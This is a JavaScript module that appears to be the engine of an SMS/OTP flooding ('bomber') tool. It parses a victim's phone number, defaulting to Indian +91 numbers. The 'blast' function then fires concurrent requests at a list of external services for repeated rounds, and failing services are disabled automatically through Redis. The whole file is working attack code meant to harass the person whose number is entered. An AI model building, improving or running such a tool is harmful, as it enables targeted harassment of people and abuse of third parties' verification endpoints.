import { BASE_HEADERS } from "./services.js";
import { incr, del, sadd, smembers } from "./redis.js";

const TIMEOUT_MS = 3500;
const CONCURRENCY = 20;
const DEADLINE_MS = 24000;
const FAIL_THRESHOLD = 8;

export const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

export async function disabledSet() {
  return new Set(await smembers("svc:disabled").catch(() => []));
}

export async function fire(svc, e164) {
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), TIMEOUT_MS);
  const started = Date.now();
  let ok = false;
  let status = 0;
  let note = "";
  try {
    const r = await fetch(svc.url, {
      method: svc.method,
      headers: { ...BASE_HEADERS, ...(svc.headers || {}) },
      body: svc.body ? svc.body(e164) : undefined,
      signal: ac.signal,
      redirect: "follow",
    });
    status = r.status;
    ok = r.status >= 200 && r.status < 400;
    note = (await r.text()).slice(0, 120);
  } catch (err) {
    note = err.name === "AbortError" ? "timeout" : String(err.message || err);
  } finally {
    clearTimeout(timer);
  }

  // auto-disable / auto-heal
  if (ok) await del(`fail:${svc.name}`).catch(() => {});
  else {
    const n = Number(await incr(`fail:${svc.name}`).catch(() => 0)) || 0;
    if (n >= FAIL_THRESHOLD) await sadd("svc:disabled", svc.name).catch(() => {});
  }

  return { service: svc.name, ok, status, ms: Date.now() - started, note };
}

export async function pool(items, limit, worker) {
  const out = new Array(items.length);
  let cursor = 0;
  const runners = Array.from({ length: Math.min(limit, items.length) || 1 }, async () => {
    while (cursor < items.length) {
      const i = cursor++;
      out[i] = await worker(items[i]);
    }
  });
  await Promise.all(runners);
  return out;
}

export function parseTarget(raw, cc = "91") {
  let d = String(raw || "").replace(/\D/g, "");
  if (!d) return null;
  if (cc === "91") {
    if (d.length === 12 && d.startsWith("91")) d = d.slice(2);
    else if (d.length === 11 && d.startsWith("0")) d = d.slice(1);
  }
  if (d.length < 6 || d.length > 15) return null;
  return { digits: d, e164: `+${cc}${d}` };
}

export async function blast({ services, e164, count }) {
  const t0 = Date.now();
  const rounds = [];
  let accepted = 0;
  let failed = 0;

  for (let round = 1; round <= count; round++) {
    if (round > 1 && Date.now() - t0 > DEADLINE_MS) {
      rounds.push({ round, skipped: true, reason: "time budget khatam" });
      continue;
    }
    const results = await pool(services, CONCURRENCY, (svc) => fire(svc, e164));
    accepted += results.filter((r) => r.ok).length;
    failed += results.filter((r) => !r.ok).length;
    rounds.push({ round, results });
    if (round < count) await sleep(250);
  }

  return { accepted, failed, rounds, tookMs: Date.now() - t0 };
}
